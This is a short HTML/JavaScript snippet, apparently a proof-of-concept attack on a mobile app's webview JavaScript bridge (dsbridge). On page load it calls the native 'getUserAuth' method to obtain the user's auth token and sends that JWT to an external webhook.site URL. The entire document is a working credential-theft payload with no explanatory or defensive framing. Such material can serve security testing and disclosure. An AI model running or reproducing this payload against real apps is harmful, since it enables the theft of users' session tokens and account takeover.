<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.js"></script>

<script>
    document.addEventListener("DOMContentLoaded", () => {
        const bridge = window.dsBridge || window._dsbridge;
        bridge.call("getUserAuth", {}, function(resp){
            const token = resp.data.authtoken;
            fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?jwt_token=" + encodeURIComponent(token));
        });
    });
</script>
